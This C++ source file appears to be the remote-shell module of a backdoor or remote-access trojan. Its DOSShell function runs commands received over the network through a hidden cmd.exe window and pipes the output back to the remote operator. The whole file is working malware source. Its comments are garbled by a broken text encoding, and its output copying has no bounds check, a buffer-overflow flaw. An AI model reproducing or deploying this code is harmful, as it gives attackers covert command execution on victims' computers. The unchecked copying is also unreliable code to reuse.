#include "StdAfx.h"
#include "DosShell.h"
#include "shlwapi.h"
#pragma comment(lib,"shlwapi.lib")

//���ܵ�Shell
void DOSShell(char *pBuf, LPMsgHead lpMsgHead)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	HANDLE hRead = NULL, hWrite = NULL;

	TCHAR Cmdline[256] = "cmd.exe /c ";     //�����л���
	char ReadBuf[1024] = {0};    //���ͻ���
	SECURITY_ATTRIBUTES sa;     //��ȫ������
	DWORD dwLen = 0, bytesRead = 0;

	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;

	//���������ܵ�,������ɱ
	if (!CreatePipe(&hRead, &hWrite, &sa, 0))  
	{
		lpMsgHead->dwCmd  = CMD_SHELLERR;
		lpMsgHead->dwSize = 0;
		if(hRead != NULL)
			CloseHandle(hRead);
		if(hWrite != NULL)
			CloseHandle(hWrite);
		return;
	}

	si.cb=sizeof(STARTUPINFO);
	GetStartupInfo(&si);
	si.hStdError = hWrite;
	si.hStdOutput = hWrite;    //���̣�cmd�������д��ܵ�
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;

	//GetSystemDirectory(Cmdline, sizeof(Cmdline));
	//lstrcat(Cmdline,"\\cmd.exe /c ");
	StrNCat(Cmdline, pBuf, lpMsgHead->dwSize+1);
	
	if (!CreateProcess(NULL, Cmdline, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi)) 
	{
		lpMsgHead->dwCmd  = CMD_SHELLERR;
		lpMsgHead->dwSize = 0;
		if(hRead != NULL)
			CloseHandle(hRead);
		if(hWrite != NULL)
			CloseHandle(hWrite);
		return;
	}
	CloseHandle(hWrite);//��䲻��ʡ

	while (ReadFile(hRead, ReadBuf, 1024, &bytesRead, NULL))
	{
		//ƴ������
		memcpy(pBuf+dwLen, ReadBuf, bytesRead);
		dwLen += bytesRead;

		ZeroMemory(ReadBuf, 1024);
		
		Sleep(120);
	}

	lpMsgHead->dwCmd = 0;
	lpMsgHead->dwSize = dwLen;

	//�ͷž��
	if (hRead != NULL)
		CloseHandle(hRead);

	if (hWrite != NULL)
		CloseHandle(hWrite);
}
